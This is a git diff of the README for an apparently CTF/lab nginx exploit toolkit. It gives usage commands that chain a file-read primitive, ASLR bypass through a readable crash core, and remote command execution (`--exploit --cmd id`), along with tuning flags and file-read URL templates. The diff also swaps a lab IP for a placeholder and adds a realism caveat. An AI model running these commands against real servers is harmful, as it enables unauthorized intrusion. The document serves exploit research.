@@ -81,9 +81,9 @@ Compared with the initial demo runner, `nginx_rifter.py` improves the workflow i
 - It discovers nginx worker maps, libc, `system()`, build IDs, binary hashes, OS details, and kernel/core settings through the remote primitive.
 - It attempts nginx config discovery from master cmdline and common config paths, then flags vulnerable `rewrite` + `set` route candidates.
 - It prints an exploit-chain viability matrix so missing prerequisites are visible before any exploit attempt.
-- Exploit mode is an explicit handoff to the tested `demo_ctf_exploit_v1_9.py` path.
+- Exploit mode is explicit and integrated into `nginx_rifter.py`.
 
-The newer `demo4.gif` shows this flow: `nginx_rifter.py` first performs an assessment and route/config discovery, then an explicit exploit handoff demonstrates command execution. The earlier `nginx-aslr-demo.gif` remains as the original ASLR-enabled exploit demo.
+The newer `demo4.gif` shows this flow: `nginx_rifter.py` first performs an assessment and route/config discovery, then an explicit exploit run demonstrates command execution. The earlier `nginx-aslr-demo.gif` remains as the original ASLR-enabled exploit demo.
 
 ## Usage
 
@@ -100,7 +100,7 @@ For the local Docker reproduction flow, see [LAB.md](LAB.md).
 ASLR-enabled VM research chain:
 
 ```bash
-./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 \
+./ctf_remote_exploit.py --host <target-host> --port 19321 \
   --core-guided --target-len 2 --h2-victim \
   --a-count 127 --plus-count 962 \
   --tries-per-candidate 1 --max-core-hits 100
@@ -109,28 +109,33 @@ ASLR-enabled VM research chain:
 Assessment-first v2 tool:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321
+./nginx_rifter.py --target <target-host>:19321
 ```
 
-`nginx_rifter.py` is the current real-world-oriented assessor. Its default mode does not run the crashing exploit path. It profiles the HTTP file-read primitive, checks ranged and binary reads, fingerprints OS/nginx/libc, discovers nginx workers and ASLR-relevant maps, tries to recover nginx config paths through pid/cmdline/config reads, flags vulnerable `rewrite` + `set` route candidates, and prints a viability matrix for the current core-guided chain.
+`nginx_rifter.py` is the current real-world-oriented assessor and integrated PoC entry point. Its default mode does not run the crashing exploit path. It profiles the HTTP file-read primitive, checks ranged and binary reads, fingerprints OS/nginx/libc, discovers nginx workers and ASLR-relevant maps, tries to recover nginx config paths through pid/cmdline/config reads, flags vulnerable `rewrite` + `set` route candidates, and prints a viability matrix for the current core-guided chain.
+
+The current `nginx_rifter.py` is self-contained. It no longer imports or shells out to earlier demo PoC versions for assessment or exploitation.
 
 For a custom LFI/download shape:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 \
+./nginx_rifter.py --target <target-host>:19321 \
   --file-read-template 'http://{host}:{port}/download?path={path_url}{range_query}'
 ```
 
 Exploit execution is explicit:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 --exploit --cmd id --fast
+./nginx_rifter.py --target <target-host>:19321 --exploit --cmd id --fast
+
+# Discovery-only exploit smoke test, no crash probes
+./nginx_rifter.py --target <target-host>:19321 --exploit --derive-only --cmd id
 ```
 
 Recording-friendly terminal demo:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --clear
 ```
 
 `demo_ctf_exploit_v1_9.py` is the current operator-facing runner. By default it uses the best-tested lab path, keeps console output to key stages and evidence, prints detailed target fingerprints, and leaves captured command output as the final terminal block. Pass `-v` for probe/candidate-level trace output. The final command output is printed as plain terminal text, without borders or per-line prefixes.
@@ -144,12 +149,14 @@ The default file-read primitive is this fork's PHP route:
 For a different known-vulnerable CTF app or testing platform, the file-read vector is modular:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id \
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id \
   --target-profile generic \
   --file-read-template 'http://{host}:{port}/download?path={path_url}{range_query}'
 ```
 
 The template supports `{host}`, `{port}`, `{path_url}`, `{offset}`, `{length}`, and `{range_query}`. The generic profile skips this fork's lab-specific nginx config assertions, but the exploit still needs the same underlying capabilities: readable nginx worker `/proc` maps, readable libc, readable crash core, and a compatible vulnerable nginx/HTTP/2 layout. `phpinfo()` is optional; use `--phpinfo-path ''` to disable it.
+
+Realism caveat: the LFI/file-read bug class and same-host nginx/PHP-FPM deployment model are realistic. The currently reliable ASLR-bypass chain is stronger than a default production assumption because it needs a readable nginx worker crash core. Standard Ubuntu/nginx deployments commonly disable or redirect cores through apport/systemd-coredump, and application users usually cannot read worker cores unless service/core policy and filesystem permissions allow it.
 
 Additional lab notes and run logs are under `docs/`, especially:
 
